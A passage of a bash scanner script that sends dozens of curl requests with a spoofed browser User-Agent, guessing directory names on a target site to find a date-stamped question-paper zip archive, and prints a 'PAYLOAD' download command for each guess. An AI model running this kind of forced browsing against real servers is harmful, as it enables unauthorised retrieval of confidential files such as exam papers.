echo -n "Payload [Transfer-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderHandling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderHandling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderHandling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkDataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileDataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PanelQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PanelQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PanelQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminPanel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerPanel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlQPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
